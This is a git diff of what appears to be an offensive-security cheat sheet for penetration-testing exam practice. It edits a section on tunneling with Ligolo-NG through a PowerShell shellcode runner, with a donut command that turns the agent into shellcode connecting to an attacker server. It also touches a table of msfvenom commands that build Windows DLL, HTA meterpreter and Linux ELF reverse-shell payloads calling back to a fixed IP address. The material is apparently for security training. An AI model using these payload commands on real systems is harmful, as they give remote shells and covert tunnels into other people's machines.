@@ -25,7 +25,7 @@ As such, this repo is still in private and will not be published as some of the 
 
 # Tunneling - Ligolo-NG
 
-We will use the powershell shellcode runner [here](https://raw.githubusercontent.com/Extravenger/OSEPlayground/refs/heads/main/04%20-%20Tunneling/ligolo.ps1).
+We will use the powershell shellcode runner in ToolLibrary/Tunnels/ligolo.ps1
 
 1. Make sure to convert agent.exe of ligolo to shellcode: 
 - `donut -f 1 -o agent.bin -a 2 -p "-connect your-server:11601 -ignore-cert" -i agent.exe` 
@@ -392,4 +392,5 @@ impacket:
 | msfvenom DLL 32bit              | msfvenom -p windows/reverse_tcp -a x86 LHOST=192.168.45.227 LPORT=8064 -f dll > reverse_32bit.dll |
 | HTA Reverse Shell               | msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.45.227 LPORT=8064 -f hta-psh -o evil.hta |
 | Linux - x86 reverse shell       | msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.45.227 LPORT=443 -f elf > shell-x86.elf |
-| Linux - x64 reverse shell       | msfvenom -p linux/x64/shell_reverse_tcp LHOST=192.168.45.227 LPORT=443 -f elf > shell-x64.elf |
+| Linux - x64 reverse shell       | msfvenom -p linux/x64/shell_reverse_tcp LHOST=192.168.45.227 LPORT=443 -f elf > shell-x64.elf |
+
